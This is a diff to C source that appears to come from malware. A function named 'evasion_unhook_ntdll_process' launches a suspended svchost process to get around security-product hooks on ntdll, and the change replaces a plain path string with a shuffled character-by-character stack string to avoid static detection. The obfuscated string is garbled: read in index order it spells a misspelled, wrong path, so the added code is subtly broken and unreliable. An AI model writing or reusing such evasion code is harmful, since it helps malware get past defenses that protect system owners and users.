@@ -36,8 +36,43 @@ BOOL evasion_unhook_ntdll_process(void) {
     if (!is_ntdll_hooked()) return TRUE;
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
-
-    g_ldr->apis->CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CHAR p[35];
+    p[28] = 'h';
+    p[7] = 'w';
+    p[19] = 't';
+    p[0] = 'C';
+    p[33] = 'e';
+    p[14] = '3';
+    p[3] = 'W';
+    p[22] = '\\';
+    p[11] = 'y';
+    p[31] = 'x';
+    p[1] = ':';
+    p[17] = 'S';
+    p[26] = 'o';
+    p[6] = 's';
+    p[9] = 'n';
+    p[24] = 'c';
+    p[13] = 'm';
+    p[2] = '\\';
+    p[30] = '.';
+    p[8] = 'i';
+    p[20] = 'e';
+    p[5] = 'o';
+    p[16] = '\\';
+    p[29] = 's';
+    p[34] = '\0';
+    p[23] = 's';
+    p[10] = 'd';
+    p[25] = 'h';
+    p[4] = 'i';
+    p[32] = 'e';
+    p[15] = '2';
+    p[21] = 'm';
+    p[27] = 's';
+    p[12] = 's';
+    p[18] = 'y';
+    g_ldr->apis->CreateProcessA(p, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     if (!pi.hProcess) return FALSE;
 
